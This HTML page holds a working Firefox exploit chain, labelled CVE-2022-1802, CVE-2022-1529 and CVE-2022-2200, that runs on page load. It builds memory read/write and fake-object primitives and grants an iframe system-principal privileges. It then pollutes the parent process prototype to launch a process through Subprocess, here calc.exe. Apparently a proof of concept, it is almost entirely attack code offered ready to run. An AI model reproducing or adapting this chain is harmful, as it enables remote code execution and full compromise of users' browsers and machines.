<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<link rel="icon" href="data:," />
<title>exploit</title>
<script>
console.log("exploit.js loaded");

// CVE-2022-1802

var call_count = 0;
var do_capture = false;

var fake_mod = null;
var oob_arr = null;

var tmp_u32_arr1 = null;
var tmp_u32_arr2 = null;

var ab1 = null;
let ab1_view = null;

var ab2 = null;

function hex(val) {
    val = Number(val);
    let result = "0x" + val.toString(16);
    return result;
}

Object.defineProperty(BigInt.prototype, "lo", {
    get: function() {
        let lo = this & 0xFFFFFFFFn;
        return Number(lo);
    }
});
Object.defineProperty(BigInt.prototype, "hi", {
    get: function() {
        let hi = (this >> 32n) & 0xFFFFFFFFn;
        return Number(hi);
    }
});

function garbage_collect() {
    for(let i = 0; i < 3; i++) {
        new ArrayBuffer(128 * 1024 * 1024);
    }
}

function allocate_objects() {
    ab1 = new ArrayBuffer(8);
    ab2 = new ArrayBuffer(8);
    ab2.a = 0x1337;
    
    let fake_script = {};
    oob_arr = new Array();
    fake_mod = {
        ScriptSlot: fake_script,
        EnvironmentSlot: 0x11111111,
        NamespaceSlot: 0x22222222,
        StatusSlot: 0,
    };

    for(let i = 0; i < 7; i++) {
        oob_arr[i] = 0x11111111;
    }
    
    tmp_u32_arr1 = new Uint32Array(4);
    tmp_u32_arr1.fill(0x66);
    
    tmp_u32_arr2 = new Uint32Array(0x10);
    tmp_u32_arr2.ab1 = ab1;
    tmp_u32_arr2.fill(0x77);
    
    fake_mod.AsyncSlot = false;
    fake_mod.AsyncEvaluatingPostOrderSlot = true;
    fake_mod.TopLevelCapabilitySlot = undefined;
    fake_mod.AsyncParentModulesSlot = undefined;
}

function setter(original) {
    try {
        console.log("Array.prototype[0] setter called");
        Reflect.deleteProperty(Array.prototype, "0");
        this[0] = original;

        if(do_capture && arguments.callee.caller == null) {
            if(call_count == 0) {
                let module = original;
                console.log("replacing module with fake_mod");
                fake_mod.AsyncParentModulesSlot = [ module ];
                this[0] = fake_mod;
            }
            call_count++;
        }
    } catch(e) {
        console.log(e);
    }
}

function install_setter() {
    Object.defineProperty(Array.prototype, "0", {
        set: setter,
        configurable: true,
    });
}

function make_addr(lo, hi) {
    hi = BigInt(hi);
    lo = BigInt(lo);
    let result = ((hi << 32n) | lo);
    return result;
}

function tag_obj(addr) {
    let result = (0x1FFFCn << 47n) | addr;
    return result;
}

function untag_addr(addr) {
    let result = addr & (1n << 47n)-1n;
    return result;
}

function install_primitives() {
    garbage_collect();
    allocate_objects();
    install_setter();
    return new Promise((resolve, reject) => {
        do_capture = true;

        import("./1.mjs").then(() => {
            return reject(new Error("This firefox version is not vulnerable!"));
        }).catch(() => {
            console.log("corruption underway");

            oob_arr[19] = 0xBEEF;  

            if(tmp_u32_arr1.length == 4) {
                return reject(new Error("couldn't corrupt tmp_u32_arr1 :("));
            }

            let ab1_addr = make_addr(tmp_u32_arr1[42], tmp_u32_arr1[43]);
            ab1_addr = untag_addr(ab1_addr);

            let tmp_u32_arr2_backing_store = make_addr(tmp_u32_arr1[22], tmp_u32_arr1[23]);
            tmp_u32_arr1[22] = ab1_addr.lo;
            tmp_u32_arr1[23] = ab1_addr.hi;

            tmp_u32_arr2[8] = 0x60;

            ab1_view = new Uint32Array(ab1);
            let original_ab2_store = make_addr(ab1_view[14], ab1_view[15]);            

            tmp_u32_arr1[22] = tmp_u32_arr2_backing_store.lo;
            tmp_u32_arr1[23] = tmp_u32_arr2_backing_store.hi;

            let oob_arr_addr = addr_of(oob_arr);
            let oob_arr_elements = read_u64(oob_arr_addr + 0x10n);
            let oob_arr_elements_hdr_addr = oob_arr_elements - 0x10n;
            write_u32(oob_arr_elements_hdr_addr, 0);
            write_u32(oob_arr_elements_hdr_addr + 4n, 7);

            let tmp_u32_arr1_addr = addr_of(tmp_u32_arr1);
            let tmp_u32_arr1_len_addr = tmp_u32_arr1_addr + 0x20n;
            write_u32(tmp_u32_arr1_len_addr, 4);
            write_u32(tmp_u32_arr1_len_addr + 4n, 0);

            return resolve();
        }).finally(() => {
            do_capture = false;
        });
    });
}

function fake_obj(addr) {
    let tagged_addr = tag_obj(addr);

    let ab2_slots_ = make_addr(ab1_view[10], ab1_view[11]);
    write_u64(ab2_slots_, tagged_addr);

    let result = ab2.a;

    ab2.a = null;

    return result;
}

function addr_of(obj) {
    ab2.a = obj;

    let ab2_slots_ = make_addr(ab1_view[10], ab1_view[11]);

    let addr = read_u64(ab2_slots_);

    let result = untag_addr(addr);

    ab2.a = null;

    return result;
}

function read_u16(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;

    let view = new Uint16Array(ab2);
    let result = view[0];

    return result;
}

function read_u32(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;

    let view = new Uint32Array(ab2);
    let result = view[0];

    return result;
}

function read_u64(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;

    let view = new Uint32Array(ab2);
    let lo = BigInt(view[0]);
    let hi = BigInt(view[1]);

    let result = (hi << 32n) | lo;

    return result;
}

function write_u8(addr, val) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;

    let view = new Uint8Array(ab2);
    view[0] = val;
}

function write_u32(addr, val) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;

    let view = new Uint32Array(ab2);
    view[0] = val;
}

function write_u64(addr, value) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    if(value instanceof Number) {
        value = BigInt(value);
    }
    ab1_view[14] = addr.lo;
    ab1_view[15] = addr.hi;

    let view = new Uint32Array(ab2);
    view[0] = value.lo;
    view[1] = value.hi;
}

function pwn_test() {
    install_primitives().then(() => {
        console.log("primitives installed!");
    }).catch((err) => {
        console.log("exploit failed :(", err);
    });
}

if(this["window"] == undefined) {
    pwn_test();
}

// CVE-2022-1529 and CVE-2022-2200

var offsets = {};

var url_params = new URLSearchParams(location.search);
var debug = url_params.has("debug");
if(debug) {
    offsets = {
        gSystemPrincipal : 0x69699C0n,
        realm_principals : 0x130n,
        realm_isSystem : 0x224n,
    };
} else {
    offsets = {
        gSystemPrincipal : 0x5F4DBC8n,
        realm_principals : 0x138n,
        realm_isSystem : 0x22Cn,
    };
}

var privileged_window = null;
var ChromeUtils = null;
var Components = null;
var Services = null;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function find_xul_base(src_addr) {
    let addr = src_addr & ~(0x10000n - 1n);
    while(true) {
        let val = read_u16(addr);
        if(val == 0x5A4D) { //ZM
            return addr;
        }
        addr -= 0x10000n;
    }
    return false;
}

function pollute_prototype(key, value) {
    let arr = [key];
    arr.id = "id";
    Services.cpmm.sendSyncMessage("Notification:Save", {
        origin : "__proto__",
        notification : arr,
    });
    Services.cpmm.sendSyncMessage("Notification:Save", {
        origin : "__proto__",
        notification : value,
    });
}

function cleanup_pollution(key) {
    Services.cpmm.sendSyncMessage("Notification:Delete", {
        origin : "__proto__",
        id : key,
    });
}

function load_privileged_vars() {
    console.log("load bearing");
    let promise = new Promise((resolve, reject) => {
        install_primitives().then(() => {
            console.log("primitives installed!");

            let obj = {};
            let obj_addr = addr_of(obj);
            let slots_addr = obj_addr + 8n;
            let emptyObjectSlotsHeaders = read_u64(slots_addr);

            console.log("obj_addr " + hex(obj_addr));

            let xul_base = find_xul_base(emptyObjectSlotsHeaders);
            if(!xul_base) {
                return reject(new Error("xul_base not found"));
            }
            console.log("xul_base found at " + hex(xul_base));

            let gSystemPrincipal_addr = xul_base + offsets.gSystemPrincipal;
            let gSystemPrincipal = read_u64(gSystemPrincipal_addr);

            console.log("gSystemPrincipal_addr " + hex(gSystemPrincipal_addr));
            console.log("gSystemPrincipal " + hex(gSystemPrincipal));

            let iframe = document.createElement("iframe");

            let iframe_addr = addr_of(iframe);
            let shape = read_u64(iframe_addr);
            let base_shape = read_u64(shape);
            let realm = read_u64(base_shape + 8n);
            let principals__addr = realm + offsets.realm_principals;
            let principals = read_u64(principals__addr);
            write_u64(principals__addr, gSystemPrincipal + 8n);

            let isSystem__addr = realm + offsets.realm_isSystem;
            write_u8(isSystem__addr, 1);

            console.log("iframe addr " + hex(iframe_addr));
            console.log("shape " + hex(shape));
            console.log("base_shape " + hex(base_shape));
            console.log("realm " + hex(realm));
            console.log("principals " + hex(principals));
            console.log("principals__addr " + hex(principals__addr));

            let html_frame_element = read_u64(iframe_addr + 0x18n); //HTMLIFrameElement
            let mNodeInfo = read_u64(html_frame_element + 0x20n);
            let mOwnerManager = read_u64(mNodeInfo + 0x40n);
            let mPrincipal_addr = mOwnerManager + 0x38n;
            let mPrincipal = read_u64(mPrincipal_addr);
            write_u64(mPrincipal_addr, gSystemPrincipal);

            console.log("html_frame_element " + hex(html_frame_element));
            console.log("mNodeInfo " + hex(mNodeInfo));
            console.log("mOwnerManager " + hex(mOwnerManager));
            console.log("mPrincipal", hex(mPrincipal));
            console.log("mPrincipal_addr " + hex(mPrincipal_addr));        

            promise.cleanup = () => {
                console.log("cleanup kru");
                write_u64(principals__addr, principals);
                write_u64(mPrincipal_addr, mPrincipal);
                write_u8(isSystem__addr, 0);
            };

            iframe.src = "about:config";
            iframe.onload = function() {
                try {
                    privileged_window = iframe.contentWindow;
                    ChromeUtils = privileged_window.ChromeUtils;
                    Components = privileged_window.Components;
                    Services = ChromeUtils.import("resource://gre/modules/Services.jsm").Services;

                    console.log("iframe loaded", iframe);
                    console.log("privileged_window", privileged_window);
                    console.log("ChromeUtils", ChromeUtils);
                    console.log("Services", Services);

                    document.body.removeChild(iframe);

                    resolve();
                } catch(err) {
                    reject(err);
                }
            };
            document.body.appendChild(iframe);
        }).catch((err) => {
            console.log("install_primitives failed");
            reject(err);
        });
    });
    return promise;
}

function pwn() {
    console.log("pwn function called");
    let promise = load_privileged_vars();
    promise.then(() => {
        if(sessionStorage.getItem("pwned")) {
            console.log("matrix reloaded");
            sessionStorage.removeItem("pwned");
            return;
        }
        console.log("pwning");
        sessionStorage.setItem("pwned", true);

        let payload = `
        try {
            console.log("running payload");
            delete Object.prototype.onoverflow;
            delete Object.prototype.style;

            for(let tab = this; tab != null; tab = tab.previousSibling) {
                tab.removeAttribute("onoverflow");
                tab.removeAttribute("style");
            }

            let gBrowser = window.gBrowser;
            let selected_tab = gBrowser._selectedTab;
            let is_about_blank = (selected_tab._fullLabel == "New Tab");
            if(is_about_blank) {
                console.log(" is_about_blank!!!", selected_tab);
            }
            let item = selected_tab.attributes.getNamedItem("crashed");
            let is_crashed = item && item.nodeValue;

            if(is_crashed || is_about_blank) {
                gBrowser.removeTab(selected_tab);

                let { Subprocess } = ChromeUtils.import("resource://gre/modules/Subprocess.jsm");
                let result = Subprocess.call({ command: "C:\\\\windows\\\\system32\\\\calc.exe" });
            }
        } catch(err) {
            console.log(err);
        }
        `;

        pollute_prototype("onoverflow", payload);
        pollute_prototype("style", "text-indent: 500px");
        cleanup_pollution("id");

        console.log("blank window");
        let win = Services.ww.openWindow(
            window, "about:blank", "crashwin", null, null);
        console.log("crash window");
        win.location = "crash.html";
        console.log("pwned!");
        
    }).catch((err) => {
        console.log("exploit failed!", err);
    }).finally(() => {
        if (typeof promise.cleanup === "function") {
            promise.cleanup();
        }
    });
}

window.onload = pwn;
</script>
</head>
<body>
<br />
</body>
</html>
